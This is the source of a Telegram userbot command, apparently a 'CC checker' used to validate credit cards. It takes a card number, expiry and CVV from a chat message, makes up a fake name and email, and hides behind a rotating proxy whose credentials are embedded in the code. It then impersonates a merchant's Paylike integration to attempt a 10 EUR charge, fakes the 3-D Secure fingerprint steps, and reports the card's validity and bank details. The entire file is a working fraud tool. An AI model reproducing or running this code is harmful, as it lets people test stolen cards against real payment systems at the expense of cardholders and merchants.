import httpx
import string
import random
import time, asyncio
import re 

from datetime import datetime
from telethon import events
from ubb import Ubot
from ..func import http


@Ubot.on(events.NewMessage(pattern=r'\.pa'))
async def pa_charge(event):
    cc = event.message.message[len('.pa '):]
    reply_msg = await event.get_reply_message()
    if reply_msg:
        cc = reply_msg.message
    x = re.findall(r'\d+', cc)
    ccn = x[0]
    mm = x[1]
    yy = x[2]
    cvv = x[3]
    VALID = ('37', '34', '4', '51', '52', '53', '54', '55', '65', '6011')
    if not ccn.startswith(VALID):
        return await event.edit('**Invalid CC Type**')
    start = time.time()

    letters = string.ascii_lowercase
    First = ''.join(random.choice(letters) for i in range(6))
    Last = ''.join(random.choice(letters) for i in range(6))
    Name = f'{First} {Last}'
    Email = f'{First}.{Last}@gmail.com'
    RND = ''.join(random.choices(string.ascii_letters + string.digits, k = 7))
    proxies = {
        "http://": "http://bjlkawrz-rotate:kxbg88y356ra@p.webshare.io:80/", 
        "https://": "http://bjlkawrz-rotate:kxbg88y356ra@p.webshare.io:80/"
    }
    
    async with httpx.AsyncClient() as client:
        head = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Mobile Safari/537.36",
            "Accept": "*/*",
            "X-Client": "sdk-7-fHMnxo",
            "Accept-Version": "1",
            "Origin": "https://mepei.com",
            "Referer": "https://mepei.com/",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json"
        }
        payload = {
            "type": "pcn",
            "value": ccn
        }
        r = await client.post('https://vault.paylike.io/', headers=head, json=payload)
        print(r.text)
        Token = r.json()['token']
        
        headers1 = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Mobile Safari/537.36",
            "Accept": "*/*",
            "X-Client": "sdk-7-fHMnxo",
            "Accept-Version": "1",
            "Referer": "https://mepei.com/",
            "Origin": "https://mepei.com",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json"
        }
        payload1 = {
            "type": "pcsc",
            "value": cvv
        }
        r1 = await client.post('https://vault.paylike.io/', headers=headers1, json=payload1)
        Token2 = r1.json()['token']
        
        headers2 = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Mobile Safari/537.36",
            "Accept": "*/*",
            "X-Client": "sdk-7-fHMnxo",
            "Accept-Version": "1",
            "Referer": "https://mepei.com/",
            "Origin": "https://mepei.com",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json"
        }
        payload2 = {
            "tokenize": False,
            "integration": {
                "key": "d547af8d-38fa-424a-933e-e4bbc5c8e11a"
            },
            "amount": {
                "currency": "EUR",
                "exponent": 2,
                "value": 1000
            },
            "card": {
                "number": {
                "token": Token
                },
                "expiry": {
                    "month": int(mm),
                    "year": int(yy)
                },
                "code": {
                    "token": Token2
                }
            },
            "custom": {
                "name": Name,
                "amount": "10.00"
            },
            "recurring": False,
            "hints": []
        }
        r2 = await client.post('https://b.paylike.io/payments', headers=headers2, json=payload2)
        match = re.search(r'path":"["[\"]?([^"]+)', r2.text)
        path = match.group(1)
        
        headers3 = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Mobile Safari/537.36",
            "Accept": "*/*",
            "X-Client": "sdk-7-fHMnxo",
            "Accept-Version": "1",
            "Referer": "https://mepei.com/",
            "Origin": "https://mepei.com",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json"
        }
        payload3 = {
            "tokenize": False,
            "integration": {
                "key": "d547af8d-38fa-424a-933e-e4bbc5c8e11a"
            },
            "amount": {
                "currency": "EUR",
                "exponent": 2,
                "value": 1000
            },
            "card": {
                "number": {
                "token": Token
                },
                "expiry": {
                    "month": int(mm),
                    "year": int(yy)
                },
                "code": {
                    "token": Token2
                }
            },
            "custom": {
                "name": Name,
                "amount": "10.00"
            },
            "recurring": False,
            "hints": []
        }
        r3 = await client.post(f'https://b.paylike.io{path}', headers=headers3, json=payload3)
        hint = r3.text.split('"')[3]
        
        headers4 = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Mobile Safari/537.36",
            "Accept": "*/*",
            "X-Client": "sdk-7-fHMnxo",
            "Accept-Version": "1",
            "Referer": "https://mepei.com/",
            "Origin": "https://mepei.com",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json"
        }
        payload4 = {
            "tokenize": False,
            "integration": {
                "key": "d547af8d-38fa-424a-933e-e4bbc5c8e11a"
            },
            "amount": {
                "currency": "EUR",
                "exponent": 2,
                "value": 1000
            },
            "card": {
                "number": {
                "token": Token
                },
                "expiry": {
                    "month": int(mm),
                    "year": int(yy)
                },
                "code": {
                    "token": Token2
                }
            },
            "custom": {
                "name": Name,
                "amount": "10.00"
            },
            "recurring": False,
            "hints": [str(hint)]
        }
        r4 = await client.post('https://b.paylike.io/payments', headers=headers4, json=payload4)
        match1 = re.search(r'path":"["[\"]?([^"]+)', r4.text)
        path1 = match1.group(1)
        print(r4.text)
        
        headers5 = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Mobile Safari/537.36",
            "Accept": "*/*",
            "X-Client": "sdk-7-fHMnxo",
            "Accept-Version": "1",
            "Referer": "https://mepei.com/",
            "Origin": "https://mepei.com",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json"
        }
        payload5 = {
            "tokenize": False,
            "integration": {
                "key": "d547af8d-38fa-424a-933e-e4bbc5c8e11a"
            },
            "amount": {
                "currency": "EUR",
                "exponent": 2,
                "value": 1000
            },
            "card": {
                "number": {
                "token": Token
                },
                "expiry": {
                    "month": int(mm),
                    "year": int(yy)
                },
                "code": {
                    "token": Token2
                }
            },
            "custom": {
                "name": Name,
                "amount": "10.00"
            },
            "recurring": False,
            "hints": [str(hint)]
        }
        r5 = await client.post(f'https://b.paylike.io{path1}', headers=headers5, json=payload5)
        print(r5.text)
        hint1 = r5.text.split('"')[3]
        
        headers6 = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Mobile Safari/537.36",
            "Accept": "*/*",
            "X-Client": "sdk-7-fHMnxo",
            "Accept-Version": "1",
            "Referer": "https://mepei.com/",
            "Origin": "https://mepei.com",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json"
        }
        payload6 = {
            "tokenize": False,
            "integration": {
                "key": "d547af8d-38fa-424a-933e-e4bbc5c8e11a"
            },
            "amount": {
                "currency": "EUR",
                "exponent": 2,
                "value": 1000
            },
            "card": {
                "number": {
                "token": Token
                },
                "expiry": {
                    "month": int(mm),
                    "year": int(yy)
                },
                "code": {
                    "token": Token2
                }
            },
            "custom": {
                "name": Name,
                "amount": "10.00"
            },
            "recurring": False,
            "hints": [str(hint),str(hint1)]
        }
        r6 = await client.post('https://b.paylike.io/payments', headers=headers6, json=payload6)
        match2 = re.search(r'path":"["[\"]?([^"]+)', r6.text)
        path2 = match2.group(1)
        print(r6.text)
        
        await asyncio.sleep(0.5)
        
        headers7 = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Mobile Safari/537.36",
            "Accept": "*/*",
            "X-Client": "sdk-7-fHMnxo",
            "Accept-Version": "1",
            "Referer": "https://mepei.com/",
            "Origin": "https://mepei.com",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json"
        }
        payload7 = {
            "tokenize": False,
            "integration": {
                "key": "d547af8d-38fa-424a-933e-e4bbc5c8e11a"
            },
            "amount": {
                "currency": "EUR",
                "exponent": 2,
                "value": 1000
            },
            "card": {
                "number": {
                "token": Token
                },
                "expiry": {
                    "month": int(mm),
                    "year": int(yy)
                },
                "code": {
                    "token": Token2
                }
            },
            "custom": {
                "name": Name,
                "amount": "10.00"
            },
            "recurring": False,
            "hints": [str(hint),str(hint1)]
        }
        r7 = await client.post(f'https://b.paylike.io{path2}', headers=headers7, json=payload7)
        print(r7.text)
        hint2 = r7.text.split('"')[11]
        
        await asyncio.sleep(0.5)
        
        headers8 = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Mobile Safari/537.36",
            "Accept": "*/*",
            "X-Client": "sdk-7-fHMnxo",
            "Accept-Version": "1",
            "Referer": "https://mepei.com/",
            "Origin": "https://mepei.com",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json"
        }
        payload8 = {
            "fingerprint": {
                "colorDepth": 24,
                "javaEnabled": False,
                "language": "en-US",
                "screen": {
                    "height": 760,
                    "width": 360
                },
                "timezone": -330
            }
        }
            
        r8 = await client.post('https://b.paylike.io/payments/challenges/fingerprint/terminate', headers=headers8, json=payload8)
        print(r8.text)
        hint3 = r8.text.split('"')[3]
        hint4 = r8.text.split('"')[5]
        
        await asyncio.sleep(0.5)
        
        headers9 = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Mobile Safari/537.36",
            "Accept": "*/*",
            "X-Client": "sdk-7-fHMnxo",
            "Accept-Version": "1",
            "Referer": "https://mepei.com/",
            "Origin": "https://mepei.com",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json"
        }
        payload9 = {
            "tokenize": False,
            "integration": {
                "key": "d547af8d-38fa-424a-933e-e4bbc5c8e11a"
            },
            "amount": {
                "currency": "EUR",
                "exponent": 2,
                "value": 1000
            },
            "card": {
                "number": {
                "token": Token
                },
                "expiry": {
                    "month": int(mm),
                    "year": int(yy)
                },
                "code": {
                    "token": Token2
                }
            },
            "custom": {
                "name": Name,
                "amount": "10.00"
            },
            "recurring": False,
            "hints": [str(hint),str(hint1),str(hint2),str(hint3),str(hint4)]
        }
        r9 = await client.post('https://b.paylike.io/payments', headers=headers9, json=payload9)

        match3 = re.search(r'path":"["[\"]?([^"]+)', r9.text)
        path3 = match3.group(1)
        print(r9.text)
        
        await asyncio.sleep(5)
        
        headers0 = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Mobile Safari/537.36",
            "Accept": "*/*",
            "X-Client": "sdk-7-fHMnxo",
            "Accept-Version": "1",
            "Referer": "https://mepei.com/",
            "Origin": "https://mepei.com",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json"
        }
        payload0 = {
            "tokenize": False,
            "integration": {
                "key": "d547af8d-38fa-424a-933e-e4bbc5c8e11a"
            },
            "amount": {
                "currency": "EUR",
                "exponent": 2,
                "value": 1000
            },
            "card": {
                "number": {
                "token": Token
                },
                "expiry": {
                    "month": int(mm),
                    "year": int(yy)
                },
                "code": {
                    "token": Token2
                }
            },
            "custom": {
                "name": Name,
                "amount": "10.00"
            },
            "recurring": False,
            "hints": [str(hint),str(hint1),str(hint2),str(hint3),str(hint4)]
        }
        rx = await client.post(f'https://b.paylike.io{path3}', headers=headers0, json=payload0)
        print(rx.text)
        Res1 = rx.text
        
        end = time.time()
        B = await http.get(f'http://binchk-api.vercel.app/bin={ccn[:6]}')
        BE = B.json()
        
        await event.edit(f'◤❌**CC**⇝ `{ccn}|{mm}|{yy}|{cvv}`\n'+
                             f'╠**Msg**⇝ `{Res1}`\n'+
                             f'╠**Gate**⇝ Paylike 10€\n'+
                             f'╠**BIN-INFO⤵**\n'+
                             f'╠**{BE["brand"]} - {BE["type"]} **\n'+
                             f'╠**Bank↬ {BE["bank"]}**\n'+
                             f'╠**Country↬ {BE["code"]}({BE["flag"]})**\n'+
                             f'╠**Time-Took**⇝ {end-start:0.2f}\n'+
                             f'⟿**Userbot-By** ⇝ @Xbinner◢')
